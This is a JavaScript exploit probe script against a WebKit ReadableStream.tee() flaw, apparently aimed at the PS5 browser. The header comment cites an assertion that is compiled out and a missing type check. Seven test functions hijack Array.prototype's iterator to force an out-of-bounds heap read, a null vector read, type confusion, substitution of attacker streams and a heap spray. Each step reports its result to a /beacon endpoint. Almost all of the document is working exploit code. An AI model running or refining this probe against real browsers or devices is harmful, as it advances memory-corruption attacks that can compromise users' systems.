/*
 * p432 -- ReadableStream.tee() iterator bypass: ASSERT(size==2) compiled out + fromObject no type check
 *
 * Source: InternalReadableStream.cpp:191-195
 *   auto results = Detail::SequenceConverter<IDLObject>::convert(*globalObject, result);
 *   ASSERT(results.size() == 2);  // COMPILED OUT on PS5!
 *   return std::make_pair(
 *     InternalReadableStream::fromObject(jsDOMGlobalObject, *results[0].get()),  // NO TYPE CHECK
 *     InternalReadableStream::fromObject(jsDOMGlobalObject, *results[1].get())   // NO TYPE CHECK
 *   );
 *
 * SequenceConverter uses forEachInIterable when iterator is overridden (line 136-137):
 *   if (!array->isIteratorProtocolFastAndNonObservable())
 *     GenericConverter::convert(lexicalGlobalObject, object);  // uses Symbol.iterator
 *
 * Attack: override Array.prototype[Symbol.iterator] before tee(), substitute or reduce items.
 *   - Return 1 item: results[1] reads OOB past vector allocation (heap over-read)
 *   - Return 0 items: results[0] reads null vector (crash or uninitialized)
 *   - Return 2 non-stream objects: type confusion, fromObject wraps anything
 *   - Return 2 attacker ReadableStreams: stream substitution (like V429 but for tee)
 *
 * Beacon prefix: V432-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V432-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

// ================================================================
// Test F: Control -- verify tee() uses Array iteration (log only)
// ================================================================

function testF() {
  B("F-START");
  var origIter = Array.prototype[Symbol.iterator];
  var callLog = [];

  try {
    var rs = new ReadableStream({
      start: function(ctrl) {
        ctrl.enqueue("chunk1");
        ctrl.close();
      }
    });

    Array.prototype[Symbol.iterator] = function() {
      var id = callLog.length;
      callLog.push({len: this.length});
      B("F-ITER-" + id, {len: this.length});

      var arr = this;
      var idx = 0;
      return {
        next: function() {
          if (idx < arr.length) {
            return {value: arr[idx++], done: false};
          }
          return {done: true};
        }
      };
    };

    var branches = rs.tee();
    B("F-TEE-OK", {branchCount: branches.length, iterCalls: callLog.length});

    // Log what we got
    for (var i = 0; i < callLog.length && i < 5; i++) {
      B("F-CALL-" + i, callLog[i]);
    }

    // Try reading from branch 0
    if (branches[0]) {
      try {
        var r = branches[0].getReader();
        r.read().then(function(res) {
          B("F-READ-0", {done: res.done, val: typeof res.value});
        }).catch(function(e) {
          B("F-READ-0-ERR", e.message ? e.message.slice(0, 60) : String(e));
        });
      } catch(e) {
        B("F-READER-0-ERR", e.message ? e.message.slice(0, 60) : String(e));
      }
    }

  } catch(e) {
    B("F-ERR", e.message ? e.message.slice(0, 100) : String(e));
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
}

// ================================================================
// Test A: Return 1 item from tee() iterator -- OOB read at results[1]
// ================================================================

function testA() {
  B("A-START");
  var origIter = Array.prototype[Symbol.iterator];
  var iterCallCount = 0;

  try {
    var rs = new ReadableStream({
      start: function(ctrl) {
        ctrl.enqueue("data");
        ctrl.close();
      }
    });

    Array.prototype[Symbol.iterator] = function() {
      iterCallCount++;
      var callNum = iterCallCount;
      var arr = this;
      var idx = 0;

      if (callNum === 1) {
        // First iterator call on the tee result array
        // Return only the first item (branch1), skip branch2
        return {
          next: function() {
            if (idx < 1 && idx < arr.length) {
              var val = arr[idx];
              B("A-ITER1-ITEM-" + idx, {type: typeof val, ctor: val && val.constructor ? val.constructor.name : "?"});
              idx++;
              return {value: val, done: false};
            }
            return {done: true};
          }
        };
      }

      // All other calls: pass through
      return origIter.call(arr);
    };

    try {
      var branches = rs.tee();
      B("A-TEE-OK", {
        branchCount: branches ? branches.length : "null",
        type0: branches && branches[0] ? branches[0].constructor.name : "null",
        type1: branches && branches[1] ? branches[1].constructor.name : "null"
      });

      // If we got branches, try to use them
      if (branches && branches[0]) {
        try {
          var r0 = branches[0].getReader();
          B("A-READER-0-OK");
          r0.releaseLock();
        } catch(e) {
          B("A-READER-0-ERR", e.message ? e.message.slice(0, 60) : String(e));
        }
      }
      if (branches && branches[1]) {
        try {
          var r1 = branches[1].getReader();
          B("A-READER-1-OK");
          r1.releaseLock();
        } catch(e) {
          B("A-READER-1-ERR", e.message ? e.message.slice(0, 60) : String(e));
        }
      }
    } catch(e) {
      B("A-TEE-ERR", e.message ? e.message.slice(0, 100) : String(e));
    }

  } catch(e) {
    B("A-ERR", e.message ? e.message.slice(0, 100) : String(e));
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
}

// ================================================================
// Test B: Return 0 items from tee() iterator -- results[0] null/OOB
// ================================================================

function testB() {
  B("B-START");
  var origIter = Array.prototype[Symbol.iterator];
  var iterCallCount = 0;

  try {
    var rs = new ReadableStream({
      start: function(ctrl) {
        ctrl.enqueue("data");
        ctrl.close();
      }
    });

    Array.prototype[Symbol.iterator] = function() {
      iterCallCount++;
      var callNum = iterCallCount;

      if (callNum === 1) {
        B("B-RETURNING-0-ITEMS");
        return {
          next: function() {
            return {done: true};
          }
        };
      }

      return origIter.call(this);
    };

    try {
      var branches = rs.tee();
      B("B-TEE-OK", {
        branchCount: branches ? branches.length : "null",
        type0: branches && branches[0] ? typeof branches[0] : "null",
        type1: branches && branches[1] ? typeof branches[1] : "null"
      });
    } catch(e) {
      B("B-TEE-ERR", e.message ? e.message.slice(0, 100) : String(e));
    }

  } catch(e) {
    B("B-ERR", e.message ? e.message.slice(0, 100) : String(e));
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
}

// ================================================================
// Test C: Return 2 plain objects (not streams) -- type confusion
// ================================================================

function testC() {
  B("C-START");
  var origIter = Array.prototype[Symbol.iterator];
  var iterCallCount = 0;

  var fakeObj1 = { fake: true, id: 1 };
  var fakeObj2 = { fake: true, id: 2 };

  try {
    var rs = new ReadableStream({
      start: function(ctrl) {
        ctrl.enqueue("data");
        ctrl.close();
      }
    });

    Array.prototype[Symbol.iterator] = function() {
      iterCallCount++;
      var callNum = iterCallCount;

      if (callNum === 1) {
        B("C-SUBSTITUTING-FAKES");
        var items = [fakeObj1, fakeObj2];
        var fi = 0;
        return {
          next: function() {
            if (fi < items.length) {
              return {value: items[fi++], done: false};
            }
            return {done: true};
          }
        };
      }

      return origIter.call(this);
    };

    try {
      var branches = rs.tee();
      B("C-TEE-OK", {
        branchCount: branches ? branches.length : "null",
        type0: branches && branches[0] ? branches[0].constructor.name : "null",
        type1: branches && branches[1] ? branches[1].constructor.name : "null"
      });

      // Try to use branch 0 as a ReadableStream
      if (branches && branches[0]) {
        B("C-BRANCH0-TYPE", typeof branches[0]);
        try {
          var r = branches[0].getReader();
          B("C-READER-0-OK");
        } catch(e) {
          B("C-READER-0-ERR", e.message ? e.message.slice(0, 80) : String(e));
        }

        try {
          var locked = branches[0].locked;
          B("C-LOCKED-0", locked);
        } catch(e) {
          B("C-LOCKED-0-ERR", e.message ? e.message.slice(0, 60) : String(e));
        }
      }

    } catch(e) {
      B("C-TEE-ERR", e.message ? e.message.slice(0, 100) : String(e));
    }

  } catch(e) {
    B("C-ERR", e.message ? e.message.slice(0, 100) : String(e));
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
}

// ================================================================
// Test D: Return 2 attacker ReadableStreams -- stream substitution
// ================================================================

function testD() {
  B("D-START");
  var origIter = Array.prototype[Symbol.iterator];
  var iterCallCount = 0;

  var attackerCtrl1 = null;
  var attackerCtrl2 = null;
  var attacker1 = new ReadableStream({
    start: function(ctrl) { attackerCtrl1 = ctrl; }
  });
  var attacker2 = new ReadableStream({
    start: function(ctrl) { attackerCtrl2 = ctrl; }
  });

  // Track what we intercept
  var realBranches = [];

  try {
    var rs = new ReadableStream({
      start: function(ctrl) {
        ctrl.enqueue("secret-data-1");
        ctrl.enqueue("secret-data-2");
        ctrl.close();
      }
    });

    Array.prototype[Symbol.iterator] = function() {
      iterCallCount++;
      var callNum = iterCallCount;
      var arr = this;

      if (callNum === 1) {
        B("D-INTERCEPTING", {len: arr.length});
        // Capture real branches
        for (var k = 0; k < arr.length; k++) {
          realBranches.push(arr[k]);
        }
        // Return attacker streams instead
        var items = [attacker1, attacker2];
        var fi = 0;
        return {
          next: function() {
            if (fi < items.length) {
              return {value: items[fi++], done: false};
            }
            return {done: true};
          }
        };
      }

      return origIter.call(this);
    };

    var branches = rs.tee();
    B("D-TEE-OK", {branchCount: branches ? branches.length : "null"});

    // branches[0] and branches[1] should be attacker streams
    B("D-IS-ATTACKER-0", branches[0] === attacker1);
    B("D-IS-ATTACKER-1", branches[1] === attacker2);

    // Real branches captured?
    B("D-REAL-CAPTURED", realBranches.length);

    // Enqueue controlled data to attacker streams (which are now the tee branches)
    if (attackerCtrl1) {
      attackerCtrl1.enqueue("injected-by-attacker");
      B("D-INJECT-OK");
    }

    // Read from branch 0 -- should get attacker's data, not "secret-data"
    if (branches[0]) {
      try {
        var r = branches[0].getReader();
        r.read().then(function(res) {
          B("D-READ-0", {done: res.done, val: String(res.value).slice(0, 40)});
        }).catch(function(e) {
          B("D-READ-0-ERR", e.message ? e.message.slice(0, 60) : String(e));
        });
      } catch(e) {
        B("D-READER-0-ERR", e.message ? e.message.slice(0, 60) : String(e));
      }
    }

    // Read from REAL branch 0 -- should have the original data
    if (realBranches[0]) {
      try {
        var rr = realBranches[0].getReader();
        rr.read().then(function(res) {
          B("D-REAL-READ-0", {done: res.done, val: String(res.value).slice(0, 40)});
        }).catch(function(e) {
          B("D-REAL-READ-0-ERR", e.message ? e.message.slice(0, 60) : String(e));
        });
      } catch(e) {
        B("D-REAL-READER-0-ERR", e.message ? e.message.slice(0, 60) : String(e));
      }
    }

  } catch(e) {
    B("D-ERR", e.message ? e.message.slice(0, 100) : String(e));
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
}

// ================================================================
// Test E: Heap spray + return 1 item (OOB read into sprayed memory)
// ================================================================

function testE() {
  B("E-START");
  var origIter = Array.prototype[Symbol.iterator];
  var iterCallCount = 0;

  try {
    // Spray objects that might land adjacent to the Vector allocation
    var spray = [];
    for (var i = 0; i < 1000; i++) {
      spray.push({marker: 0x41414141, idx: i});
    }

    var rs = new ReadableStream({
      start: function(ctrl) {
        ctrl.enqueue("data");
        ctrl.close();
      }
    });

    Array.prototype[Symbol.iterator] = function() {
      iterCallCount++;
      var callNum = iterCallCount;
      var arr = this;
      var idx = 0;

      if (callNum === 1) {
        B("E-RETURNING-1-ITEM");
        return {
          next: function() {
            if (idx < 1 && idx < arr.length) {
              idx++;
              return {value: arr[0], done: false};
            }
            return {done: true};
          }
        };
      }

      return origIter.call(this);
    };

    try {
      var branches = rs.tee();
      B("E-TEE-OK", {
        branchCount: branches ? branches.length : "null",
        type0: branches && branches[0] ? branches[0].constructor.name : "null",
        type1: branches && branches[1] ? branches[1].constructor.name : "null"
      });

      // Branch 0 should be valid (real branch 1)
      // Branch 1 should be from OOB read (uninitialized/sprayed memory)
      if (branches && branches[1]) {
        B("E-BRANCH1-EXISTS", {type: typeof branches[1], ctor: branches[1].constructor ? branches[1].constructor.name : "?"});
        try {
          var locked = branches[1].locked;
          B("E-BRANCH1-LOCKED", locked);
        } catch(e) {
          B("E-BRANCH1-LOCKED-ERR", e.message ? e.message.slice(0, 60) : String(e));
        }
        try {
          var r = branches[1].getReader();
          B("E-BRANCH1-READER-OK");
        } catch(e) {
          B("E-BRANCH1-READER-ERR", e.message ? e.message.slice(0, 80) : String(e));
        }
      } else {
        B("E-BRANCH1-NULL");
      }

    } catch(e) {
      B("E-TEE-ERR", e.message ? e.message.slice(0, 100) : String(e));
    }

    spray = null;

  } catch(e) {
    B("E-ERR", e.message ? e.message.slice(0, 100) : String(e));
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
}

// ================================================================
// Test G: Response.clone() tee interception (FetchBody.cpp:317)
// ================================================================

function testG() {
  B("G-START");
  var origIter = Array.prototype[Symbol.iterator];
  var iterCallCount = 0;

  try {
    // Create a Response with a body
    var body = new ReadableStream({
      start: function(ctrl) {
        ctrl.enqueue(new TextEncoder().encode("response-body-data"));
        ctrl.close();
      }
    });

    var response = new Response(body);
    B("G-RESPONSE-CREATED");

    Array.prototype[Symbol.iterator] = function() {
      iterCallCount++;
      B("G-ITER-" + iterCallCount, {len: this.length});

      // Pass through all calls to see if clone triggers iterator
      var arr = this;
      var idx = 0;
      return {
        next: function() {
          if (idx < arr.length) {
            return {value: arr[idx++], done: false};
          }
          return {done: true};
        }
      };
    };

    try {
      var cloned = response.clone();
      B("G-CLONE-OK", {iterCalls: iterCallCount});
    } catch(e) {
      B("G-CLONE-ERR", e.message ? e.message.slice(0, 80) : String(e));
    }

  } catch(e) {
    B("G-ERR", e.message ? e.message.slice(0, 100) : String(e));
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
}

// Run tests in order: control first, then exploits
testF();  // Control: does tee use iterator?
testA();  // OOB: 1 item
testB();  // Null: 0 items
testC();  // Type confusion: plain objects
testD();  // Stream substitution
testE();  // Heap spray + 1 item OOB
testG();  // Response.clone() interception

setTimeout(function() { B("DONE"); }, 3000);
})();
